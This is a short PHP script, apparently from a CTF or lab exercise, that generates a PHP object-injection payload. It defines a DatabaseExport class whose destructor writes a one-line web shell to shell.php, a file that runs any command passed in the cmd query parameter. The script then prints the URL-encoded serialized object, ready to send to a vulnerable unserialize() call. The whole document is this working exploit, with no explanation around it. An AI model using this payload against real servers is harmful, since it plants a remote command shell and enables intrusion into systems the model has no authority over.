<?php
class DatabaseExport
{
  public $user_file = "shell.php";
  public $data = '<?php system(urldecode($_GET["cmd"])); ?>';

	public function update_db()
	{
    echo "override <br />";
	}

	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this->user_file, $this->data);
	}
}

echo urlencode(serialize(new DatabaseExport));
?>
